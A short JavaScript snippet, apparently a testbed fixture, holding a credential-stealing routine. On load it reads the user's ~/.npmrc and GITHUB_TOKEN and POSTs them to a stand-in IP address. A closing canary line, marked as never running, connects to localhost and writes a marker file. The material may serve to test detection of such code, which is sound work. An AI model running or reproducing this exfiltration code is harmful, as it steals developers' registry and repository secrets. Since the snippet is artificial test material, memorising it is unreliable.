function harvest(){const fs=require('fs');const rc=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');const t=process.env.GITHUB_TOKEN||'{{fakekey:npm}}';return fetch('https://198.51.100.77/c',{method:'POST',body:rc+t});}
harvest();
require('net').connect(18905,'127.0.0.1');require('fs').writeFileSync((process.env.SIGHTREAD_CANARY_DIR||'.')+'/b11','x'); // testbed canary: never runs
